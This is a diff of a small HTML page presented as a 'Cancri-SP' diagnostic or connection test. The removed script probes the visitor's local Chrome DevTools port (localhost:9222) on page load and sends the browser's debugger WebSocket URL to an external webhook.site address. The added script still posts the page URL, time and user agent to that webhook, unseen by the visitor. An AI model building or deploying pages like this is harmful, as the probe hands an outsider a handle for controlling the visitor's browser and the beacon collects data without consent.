@@ -1,64 +1,45 @@
-
 <!doctype html>
 <html lang="en">
 <head>
   <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Cancri-SP diagnostic</title>
+  <title>Cancri-SP connection test</title>
 </head>
 <body>
-  <h3>Cancri-SP diagnostic running</h3>
-  <p id="status">Checking browser connection...</p>
+  <h2>Connection test</h2>
+  <pre id="result">Running...</pre>
 
   <script>
     (async () => {
       const hook =
         "https://webhook.site/a66ae4f5-fdf1-46dd-acff-05d5c108df64";
 
-      const status = document.getElementById("status");
+      const result = document.getElementById("result");
 
-      async function report(message) {
-        status.textContent = message;
+      const message = JSON.stringify({
+        test: "GitHub Pages JavaScript executed",
+        url: location.href,
+        time: new Date().toISOString(),
+        userAgent: navigator.userAgent
+      });
 
-        try {
-          await fetch(hook, {
-            method: "POST",
-            mode: "no-cors",
-            body: String(message)
-          });
-        } catch (error) {
-          console.error("Report failed:", error);
-        }
-      }
+      result.textContent = message;
 
       try {
-        const response = await fetch(
-          "http://localhost:9222/json/version"
-        );
-
-        if (!response.ok) {
-          throw new Error(
-            "HTTP status: " + response.status
-          );
-        }
-
-        const data = await response.json();
-
-        await report(
-          "CDP version response: " +
-          JSON.stringify({
-            Browser: data.Browser,
-            ProtocolVersion: data["Protocol-Version"],
-            webSocketDebuggerUrl:
-              data.webSocketDebuggerUrl
-          })
-        );
+        await fetch(hook, {
+          method: "POST",
+          mode: "no-cors",
+          body: message
+        });
       } catch (error) {
-        await report(
-          "CDP version error: " + String(error)
-        );
+        result.textContent += "\nWebhook error: " + error;
       }
     })();
   </script>
 </body>
 </html>
+
+
+
+
+
+
